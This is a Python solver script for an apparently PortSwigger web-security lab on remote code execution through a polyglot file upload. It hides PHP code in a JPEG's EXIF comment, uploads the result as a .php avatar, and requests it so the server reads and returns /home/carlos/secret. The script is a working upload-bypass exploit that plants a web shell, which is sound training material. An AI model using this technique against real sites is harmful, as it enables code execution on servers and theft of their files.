import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
import os
from exif import Image as Metadata_Image
from PIL import Image as Create_Image


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab Title: Remote code execution via polyglot web shell upload
# Error can be check in function returns
# *Note: check folder write permission

proxy_urls = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
image_file_name = 'hh.jpg'
php_file_name = 'kk.php'
form_upload_field = 'avatar'
delete_files = False # if True: Delete the temp image and php files
php_code = '<?php echo "K::" . file_get_contents("/home/carlos/secret") . "::K";?>'


# Create polyglot file 
def create_files():
    try:
        # 1: Create image(JPEG) file and save
        image_1 = Create_Image.new( mode = 'L', size = (50, 50), color = 'black' ).save(image_file_name)

        # 2: Create metadata of image, and save it in comment tag
        with open( image_file_name, 'rb' ) as image:
            image_mdata = Metadata_Image(image)
            image_mdata.user_comment = php_code
        
        # 3: Create php file and write image metadata to get user secret value
        with open(php_file_name, 'wb') as new_img:
            new_img.write(image_mdata.get_file())                
    except:
        print(f"Error: {sys.exc_info()[0]}")
        exit()

    
# Extract csrf
def get_csrf(res):    
    bSoup = BeautifulSoup(res, 'html.parser')
    csrf = bSoup.find('input', {'name': 'csrf'})['value']
    return csrf

    
# Send login request
def login_req(sn):
    res = sn.get(k_url + '/login', proxies=proxy_urls, verify=False).text
    csrf = get_csrf(res)

    res = sn.post(k_url + '/login', {'csrf': csrf, 'username': username, 'password': password}, proxies=proxy_urls, verify=False).text
    
    if "Log out" in res:
        return True
    else:
        return False

# Upload polyglot file to server
def k_upload_file(sn, csrf):
    res = sn.post(k_url + '/my-account/avatar', 
        files = {form_upload_field: open(php_file_name, 'rb')},
        data = {'user': username, 'csrf': csrf},
        proxies=proxy_urls, 
        verify=False)
    
    if res.status_code == 200 and "Error:" not in res.text:
        return True
    else:
        return False


def main():
    # Create files and add metadata in file
    create_files()

    # Session persist for requests
    sn = requests.Session()
    if login_req(sn):
        res = sn.get(k_url + '/my-account', proxies=proxy_urls, verify=False).text
        csrf = get_csrf(res)
        
        # Upload file
        if k_upload_file(sn, csrf):
            # Get user profile secret
            file_req = sn.get(k_url + '/files/avatars/' + php_file_name, proxies=proxy_urls, verify=False).text

            # Extract secret code
            result = re.compile('K::(.*)::K').search(file_req)

            if result is not None and result[1] is not None:
                print("Secret:", result[1])
            else:
                print("Error! Try again.")
        else:
            print("Error! File uploading error.")
    else:
        print("Error! Wrong login credentials.")


    # Delete the temp files
    if delete_files:
        try:
            os.remove(image_file_name)
            os.remove(php_file_name)
        except:
            print("Error! While deleting files.")


if __name__ == "__main__":
    # User input: Lab URL, username, and password
    k_url = input("Enter Lab URL: ").strip().rstrip("/")
    username = input("Enter Account Username: ").strip()
    password = input("Enter Account Password: ").strip()
    
    if (not (k_url and username and password)):
        print()
        print("[-] Error! Input variable(s) missing.")
        print("[-] Lab URL: https://a...........c2.web-security-academy.net")
        print("[-] Username")
        print("[-] Password")
        sys.exit()
    else:
        print("[*] Solving....")
        main()